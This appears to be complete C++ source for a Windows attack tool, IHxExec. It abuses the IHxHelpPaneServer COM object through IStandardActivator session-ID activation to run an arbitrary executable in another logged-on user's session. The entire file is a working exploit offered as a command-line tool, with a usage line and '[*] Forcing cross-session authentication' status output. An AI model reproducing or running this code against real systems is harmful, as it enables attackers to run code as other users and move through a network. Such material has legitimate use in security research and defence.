#include "IHxExec.h"
#include "argparse.h"
#include "IStandardActivator_h.h"

struct __declspec(uuid("{8cec592c-07a1-11d9-b15e-000d56bfe6ee}"))
    IHxHelpPaneServer : public IUnknown {
    virtual HRESULT __stdcall DisplayTask(PWCHAR) = 0;
    virtual HRESULT __stdcall DisplayContents(PWCHAR) = 0;
    virtual HRESULT __stdcall DisplaySearchResults(PWCHAR) = 0;
    virtual HRESULT __stdcall Execute(const PWCHAR) = 0;
};

DWORD Win32FromHResult(HRESULT Result)
{
    if ((Result & 0xFFFF0000) == MAKE_HRESULT(SEVERITY_ERROR, FACILITY_WIN32, 0))
        return HRESULT_CODE(Result);

    if (Result == S_OK)
        return ERROR_SUCCESS;

    return ERROR_CAN_NOT_COMPLETE;
}

HRESULT CoInitializeIHxHelpIds(LPGUID Clsid, LPGUID Iid)
{
    HRESULT Result = S_OK;

    if (!SUCCEEDED(Result = CLSIDFromString(L"{8cec58ae-07a1-11d9-b15e-000d56bfe6ee}", Clsid)))
        return Result;

    if (!SUCCEEDED(Result = CLSIDFromString(L"{8cec592c-07a1-11d9-b15e-000d56bfe6ee}", Iid)))
        return Result;

    return Result;
}

void EnsureFileProtocol(wchar_t*& url)
{
    const wchar_t* prefix = L"file:///";
    size_t prefix_len = wcslen(prefix);
    size_t url_len = wcslen(url);

    if (url_len < prefix_len || wcsncmp(url, prefix, prefix_len) != 0)
    {
        size_t new_len = prefix_len + url_len + 1;
        wchar_t* new_url = new wchar_t[new_len];
        wcscpy_s(new_url, new_len, prefix);
        wcscat_s(new_url, new_len, url);

        url = new_url;
    }
}

void ShowHelp()
{
    std::wcerr << L"Usage: IHxExec.exe -s <session_id> -c <executable file>" << std::endl;
    std::wcerr << L"Usage: IHxExec.exe -s 1 -c C:/Windows/SYSTEM32/CALC.EXE" << std::endl;
}

int wmain(int argc, wchar_t* argv[])
{
    if (argc < 2)
    {
        ShowHelp();
        return 1;
    }

    wchar_t* pcUrl = getCmdOption(argv, argv + argc, L"-c");
    wchar_t* wsess = getCmdOption(argv, argv + argc, L"-s");

    if (!pcUrl || !wsess)
    {
        ShowHelp();
        return 1;
    }

    EnsureFileProtocol(pcUrl);
    DWORD session = std::stoi(wsess);

    GUID CLSID_IHxHelpPaneServer;
    GUID IID_IHxHelpPaneServer;
    HRESULT hr = S_OK;

    if (!SUCCEEDED(hr = CoInitializeIHxHelpIds(&CLSID_IHxHelpPaneServer, &IID_IHxHelpPaneServer)))
        return Win32FromHResult(hr);

    if (!SUCCEEDED(hr = CoInitializeEx(NULL, COINIT_MULTITHREADED)))
        return Win32FromHResult(hr);
    
    std::wcout << L"[*] Forcing cross-session authentication" << std::endl;

    GUID run = { 0x8cec592c, 0x07a1, 0x11d9, { 0xb1, 0x5e, 0x00, 0x0d, 0x56, 0xbf, 0xe6, 0xee } };
    GUID CLSID_ComActivator = { 0x0000033C, 0x0000, 0x0000, { 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46 } };
    GUID IID_IStandardActivator = __uuidof(IStandardActivator);
    IStandardActivator* pComAct;
    
    hr = CoCreateInstance(CLSID_ComActivator, NULL, CLSCTX_INPROC_SERVER, IID_IStandardActivator, (void**)&pComAct);
    if (FAILED(hr))
    {
        std::wcout << L"[-] Cant get IStandartActivator" << std::endl;
        return Win32FromHResult(hr);
    }

    ISpecialSystemProperties* pSpecialProperties;
    hr = pComAct->QueryInterface(IID_ISpecialSystemProperties, (void**)&pSpecialProperties);
    if (FAILED(hr))
    {
        std::wcout << L"[-] Cant get ISpecialSystemProperties" << std::endl;
        return Win32FromHResult(hr);
    }

    pSpecialProperties->SetSessionId(session, 0, 1);
    if (FAILED(hr))
    {
        std::wcout << L"[-] Cant set session ID" << std::endl;
        return Win32FromHResult(hr);
    }

    std::wcout << L"[*] Spawning COM object in the session:" << session << std::endl;

    MULTI_QI qis[1];
    qis[0].pIID = &run;
    qis[0].pItf = NULL;
    qis[0].hr = 0;

    hr = pComAct->StandardCreateInstance(CLSID_IHxHelpPaneServer, NULL, CLSCTX_ALL, NULL, 1, qis);

    if (FAILED(hr))
    {
        std::wcout << L"[-] CoCreateInstanceFailed()" << std::endl;
        return Win32FromHResult(hr);
    }

    IHxHelpPaneServer* pIHxHelpPaneServer = NULL;
    pIHxHelpPaneServer = static_cast<IHxHelpPaneServer*>(qis[0].pItf);

    std::wcout << L"[+] Executing binary: " << pcUrl << std::endl;
    hr = pIHxHelpPaneServer->Execute(pcUrl);
    if (FAILED(hr))
    {
        std::wcout << L"[-] pIHxHelpPaneServer->Execute() failed" << std::endl;
        return Win32FromHResult(hr);
    }

    if (pComAct)
    {
        pComAct->Release();
    }

    if (pSpecialProperties)
    {
        pSpecialProperties->Release();
    }

    if (pIHxHelpPaneServer) {
        pIHxHelpPaneServer->Release();
    }

    CoUninitialize();

    return Win32FromHResult(hr);
}